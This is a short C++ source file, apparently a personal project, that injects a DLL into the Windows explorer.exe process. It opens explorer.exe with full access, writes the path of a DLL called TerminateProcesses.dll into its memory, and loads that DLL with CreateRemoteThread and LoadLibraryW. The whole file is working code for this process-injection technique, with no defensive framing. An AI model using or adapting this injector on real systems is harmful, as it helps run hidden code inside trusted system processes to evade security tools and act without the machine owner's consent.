/*
Jake McLellan
Gets the PID of explorer.exe by name and attempts to inject DLL at {dllPath} into it using VirtualAllocEx/WriteProcessMemory/CreateRemoteThread method
*/
#include <Windows.h>
#include <tlhelp32.h>
#include<iostream>
#include <vector>
#include <processthreadsapi.h>


//Returns the handle of process by name {toFind}
HANDLE getExplorer(std::string toFind) {
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		std::wstring ws(procEntry.szExeFile);
		std::string str(ws.begin(), ws.end());
		if (str.compare(toFind) == 0) {
			//std::cout << "Process " << toFind << " found: " << procEntry.th32ProcessID << "\n";
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, procEntry.th32ProcessID);
			return hProcess;
		}
	} while (Process32Next(hTH32, &procEntry));
	return NULL;
}


int main() {
//int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	HANDLE processHandle;
	PVOID remoteBuffer;

	//Relative path doesn't work because it needs to be from the perspective of Explorer.exe I think
	//Just need to place TerminateProcesses.dll in a writeable Windows directory
	//wchar_t dllPath[] = TEXT("..\\..\\..\\TerminateProcesses\\x64\\Release\\TerminateProcesses.dll");
	wchar_t dllPath[] = TEXT("C:\\Users\\shell\\source\\repos\\Terminator\\TerminateProcesses\\x64\\Release\\TerminateProcesses.dll");

	//Get handle for explorer
	processHandle = getExplorer("explorer.exe");
	if (processHandle != 0) {
		//Allocate enough memory in Explorer.exe process to write the path to the DLL
		remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
		if (remoteBuffer) {
			//Write the path to explorer.exe's memory and call loadlibrary on it
			WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
			HMODULE hKernel32 = GetModuleHandle(TEXT("Kernel32"));
			PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
			//Create the thread and celebrate
			CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
			std::cout << "You did it!";
		}
		else {
			std::cout << "VirtualAllocEx failed";
		}
		CloseHandle(processHandle);
	}
	else {
		std::cout << "Unsuccessful";
		return -1;
	}
}